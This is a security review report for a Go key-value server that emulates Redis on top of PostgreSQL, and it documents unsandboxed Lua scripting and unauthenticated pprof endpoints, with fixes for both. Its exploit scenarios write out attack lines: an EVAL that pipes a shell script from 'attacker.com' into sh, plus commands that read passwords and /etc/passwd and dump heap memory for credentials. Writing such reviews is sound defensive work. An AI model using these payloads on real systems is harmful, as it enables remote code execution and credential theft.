# Security Review - 2026-03-24

Full codebase security review of pg-kv-backend (postkeys).

---

## Vuln 1: Remote Code Execution via Unsandboxed Lua Scripting

**File:** `internal/handler/lua.go:94`

- **Severity:** HIGH
- **Confidence:** 0.95
- **Category:** `remote_code_execution`

### Description

The Lua scripting engine (used by `EVAL`, `EVALSHA`, and `SCRIPT LOAD` commands) initializes gopher-lua with `SkipOpenLibs: false`, which loads **all** standard Lua libraries including `os` and `io`. These libraries provide direct access to operating system commands, file I/O, environment variables, and process control.

Real Redis explicitly removes the `os` and `io` libraries from its Lua sandbox to prevent this exact attack vector. This implementation does not apply any sandboxing.

The dangerous libraries loaded include:
- **`os.execute(cmd)`** - Execute arbitrary shell commands
- **`os.getenv(name)`** - Read environment variables (including `PG_PASSWORD`, `REDIS_PASSWORD`)
- **`os.remove(path)`** - Delete files on the filesystem
- **`os.rename(old, new)`** - Rename/move files
- **`os.exit(code)`** - Terminate the server process
- **`io.open(path, mode)`** - Read/write arbitrary files
- **`io.popen(cmd, mode)`** - Execute commands and capture output
- **`dofile(path)`** / **`loadfile(path)`** - Load and execute external Lua files
- **`debug`** library - Inspect/modify runtime internals

### Exploit Scenario

Any client connected to the Redis port (authenticated if a password is set, or any client if no password is configured) can execute arbitrary OS commands:

```
# Execute shell commands
EVAL "os.execute('curl http://attacker.com/shell.sh | sh')" 0

# Read environment variables (leaks PG and Redis passwords)
EVAL "return os.getenv('PG_PASSWORD')" 0
EVAL "return os.getenv('REDIS_PASSWORD')" 0

# Read arbitrary files
EVAL "local f = io.open('/etc/passwd', 'r'); local c = f:read('*a'); f:close(); return c" 0

# Write files (e.g., crontab, SSH keys)
EVAL "local f = io.open('/tmp/pwned', 'w'); f:write('compromised'); f:close(); return 'done'" 0

# Execute command and capture output
EVAL "local h = io.popen('id'); local r = h:read('*a'); h:close(); return r" 0

# Kill the server
EVAL "os.exit(1)" 0
```

### Recommendation

Sandbox the Lua environment by only loading safe libraries. Replace the current initialization:

```go
// BEFORE (vulnerable)
L := lua.NewState(lua.Options{
    SkipOpenLibs: false,
})
```

With selective library loading:

```go
// AFTER (sandboxed)
L := lua.NewState(lua.Options{
    SkipOpenLibs: true,
})

// Only load safe libraries (matching Redis behavior)
for _, pair := range []struct {
    name string
    fn   lua.LGFunction
}{
    {lua.LoadLibName, lua.OpenPackage},
    {lua.BaseLibName, lua.OpenBase},
    {lua.TabLibName, lua.OpenTable},
    {lua.StringLibName, lua.OpenString},
    {lua.MathLibName, lua.OpenMath},
} {
    L.Push(L.NewFunction(pair.fn))
    L.Push(lua.LString(pair.name))
    L.Call(1, 0)
}

// Remove dangerous base functions
L.SetGlobal("dofile", lua.LNil)
L.SetGlobal("loadfile", lua.LNil)
```

This matches how Redis sandboxes its Lua environment - only `base` (with `dofile`/`loadfile` removed), `table`, `string`, `math`, `cjson`, and `cmsgpack` are available.

---

## Vuln 2: Unauthenticated pprof Endpoints Expose Heap Memory

**File:** `internal/metrics/metrics.go:114-118`

- **Severity:** MEDIUM
- **Confidence:** 0.85
- **Category:** `data_exposure`

### Description

The metrics HTTP server registers Go's `net/http/pprof` debug handlers without any authentication or access control. These endpoints expose detailed runtime information including full heap memory dumps, which contain sensitive data that is present in the server's memory:

- The Redis authentication password (stored in `Handler.password`)
- PostgreSQL connection credentials (DSN contains password)
- All cached Redis key/value data currently in memory
- Lua script source code from the script cache
- Client connection state and metadata

The affected endpoints:
- `/debug/pprof/heap` - Full heap memory dump (contains all of the above)
- `/debug/pprof/goroutine` - Goroutine stacks (may contain function arguments with sensitive data)
- `/debug/pprof/cmdline` - Process command line arguments
- `/debug/pprof/profile` - CPU profile (30-second capture by default)
- `/debug/pprof/trace` - Execution trace

### Exploit Scenario

An attacker with network access to the metrics port (default `:9090`) can dump heap memory to extract credentials:

```bash
# Dump heap and search for PostgreSQL password
curl -s http://target:9090/debug/pprof/heap > heap.prof
go tool pprof -raw heap.prof | strings | grep -i "postgres\|password"

# Or use the debug=1 text format to see stack traces with values
curl -s http://target:9090/debug/pprof/goroutine?debug=2
```

Even on internal networks, this is exploitable by any service or compromised container that can reach the metrics port.

### Recommendation

Either remove pprof from the default metrics server, or gate it behind a build tag or configuration flag:

```go
// Option A: Remove pprof entirely from the default metrics server
// (use a separate admin port with auth for profiling)

// Option B: Gate behind env var
if os.Getenv("ENABLE_PPROF") == "true" {
    mux.HandleFunc("/debug/pprof/", pprof.Index)
    mux.HandleFunc("/debug/pprof/cmdline", pprof.Cmdline)
    mux.HandleFunc("/debug/pprof/profile", pprof.Profile)
    mux.HandleFunc("/debug/pprof/symbol", pprof.Symbol)
    mux.HandleFunc("/debug/pprof/trace", pprof.Trace)
}
```

---

## Summary

| # | Finding | Severity | Confidence | File |
|---|---------|----------|------------|------|
| 1 | RCE via unsandboxed Lua `os`/`io` libraries | HIGH | 0.95 | `internal/handler/lua.go:94` |
| 2 | Unauthenticated pprof leaks heap with credentials | MEDIUM | 0.85 | `internal/metrics/metrics.go:114` |

### Items Reviewed (No Issues Found)

- **SQL injection**: All queries use parameterized statements (`$1`, `$2`, etc.). Table names in `fmt.Sprintf` are derived from `dataTableForType()` which returns only hardcoded strings.
- **Authentication flow**: AUTH and HELLO auth handling is correct; no bypass paths identified.
- **RESP protocol parsing**: Binary-safe with length-prefixed bulk strings; no buffer overflows possible in Go.
- **Transaction handling**: Proper advisory locking with sorted key order prevents deadlocks; retry logic is sound.
- **Pattern matching (KEYS/SCAN)**: Uses parameterized LIKE queries; glob patterns cannot escape to SQL.
- **Pub/Sub**: Channel names are passed through PostgreSQL NOTIFY safely via parameterized queries.
